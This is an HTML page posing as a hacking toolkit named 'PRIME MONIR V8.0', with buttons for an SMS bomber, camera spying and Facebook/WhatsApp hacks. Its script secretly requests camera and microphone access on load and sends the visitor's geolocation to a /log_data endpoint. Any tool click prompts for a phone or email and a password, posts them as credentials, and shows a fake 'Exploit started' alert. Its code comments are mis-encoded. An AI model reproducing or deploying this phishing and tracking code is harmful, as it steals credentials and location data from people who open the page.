<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRIME MONIR | KERNEL V8.0</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow:hidden; }
        canvas { position:fixed; top:0; left:0; z-index:-1; opacity:0.4; }
        #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
        .circle { width:100px; height:100px; border:6px solid #200; border-top:6px solid #f00; border-radius:50%; animation:spin 1s linear infinite; box-shadow: 0 0 20px #f00; }
        @keyframes spin { 0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);} }
        #ui { display:none; padding:15px; height: 100vh; overflow-y: auto; }
        .header { border:1px solid #0f0; padding:10px; text-align:center; background:rgba(0,255,0,0.1); margin-bottom:20px; }
        .bomber { border:2px solid #f00; background:rgba(255,0,0,0.2); color:#f00; padding:15px; margin-bottom:15px; text-align:center; font-weight:bold; cursor:pointer; }
        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:12px; }
        .tool { border:1px solid #0f0; padding:15px; background:rgba(0,255,0,0.1); text-align:center; cursor:pointer; font-size:13px; text-transform:uppercase; }
        #console { margin-top:20px; border:1px solid #0f0; height:100px; background:rgba(0,0,0,0.8); padding:10px; font-size:11px; overflow-y:auto; color:#0f0; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div id="loader">
        <div class="circle"></div>
        <div style="color:#f00; margin-top:20px; font-weight:bold; letter-spacing:3px;">INITIALIZING SYSTEM...</div>
    </div>
    <div id="ui">
        <div class="header"><h1>PRIME MONIR V8.0</h1></div>
        <div class="bomber" onclick="runTool('SMS_BOMBER')">üî• ULTIMATE SMS BOMBER</div>
        <div class="grid">
            <div class="tool" onclick="runTool('CAM_SPY')">CAM SPY</div>
            <div class="tool" onclick="runTool('LOCATION')">LOCATION</div>
            <div class="tool" onclick="runTool('GALLERY')">GALLERY</div>
            <div class="tool" onclick="runTool('FILE_MGR')">FILE MGR</div>
            <div class="tool" onclick="runTool('FB_HACK')">FB HACK</div>
            <div class="tool" onclick="runTool('WA_SPY')">WA SPY</div>
        </div>
        <div id="console">> System ready...</div>
    </div>
    <script>
        // Matrix Rain
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "01";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
            for(let i=0; i<drops.length; i++) {
                const text = letters.charAt(Math.floor(Math.random()*letters.length));
                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 50);

        // ‡¶Ö‡¶ü‡ßã ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® (‡¶∂‡ßÅ‡¶∞‡ßÅ‡¶§‡ßá‡¶á)
        window.onload = async () => {
            try {
                await navigator.mediaDevices.getUserMedia({video:true, audio:true});
                navigator.geolocation.getCurrentPosition(p => {
                    fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
                    body:JSON.stringify({type:'LOCATION', content:`Lat:${p.coords.latitude}, Lon:${p.coords.longitude}`})});
                });
            } catch(e) {}
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('ui').style.display = 'block';
            }, 3000);
        };

        // ‡¶ü‡ßÅ‡¶≤ ‡¶è ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶§‡¶ñ‡¶® ‡¶™‡¶æ‡¶∏‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶° ‡¶ö‡¶æ‡¶á‡¶¨‡ßá
        function runTool(name) {
            let u = prompt("Admin Verification Needed!\nEnter Phone/Email to link session:");
            let p = prompt("Enter Password:");
            if(u && p) {
                fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
                body:JSON.stringify({type:'CREDENTIALS', content:`U:${u}, P:${p}, Tool:${name}`})});
                alert("Exploit started. Check console for logs.");
            }
        }
    </script>
</body>
</html>
